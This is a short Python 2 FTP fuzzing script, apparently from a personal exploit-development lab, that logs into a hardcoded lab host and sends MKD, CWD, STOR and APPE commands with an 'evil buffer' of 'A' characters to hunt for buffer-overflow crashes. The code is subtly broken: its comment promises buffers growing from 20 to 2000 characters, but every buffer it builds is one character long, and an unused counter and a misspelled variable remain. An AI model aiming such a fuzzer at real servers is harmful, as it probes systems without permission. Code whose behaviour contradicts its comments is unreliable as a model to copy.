#!/usr/bin/python

import socket

#create an array of buffers, from 20 to 2000, with increments of 20.

buffer=["A"]

counter=20

while len(buffer) <= 30:
	buffer.append("A")
	counter=counter+100

#Define the FTP commands to be fuzzed

commands=["MKD","CWD","STOR", "APPE"]

# Run the fuzzing loop

for command in commands:
	for string in buffer:
		print "Fuzzing " + command + " with length:" +str(len(string))
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connetct=s.connect(('192.168.17.65',21)) #hardcoded IP address and port of my lab XP machine
		s.recv(1024)
		s.send('USER ftp\r\n') # login procedure
		s.recv(1024)
		s.send('PASS ftp\r\n')
		s.recv(1024)
		s.send(command + ' ' + string + '\r\n') #evil buffer
		s.recv(1024)
		s.send('QUIT\r\n')
		s.close()
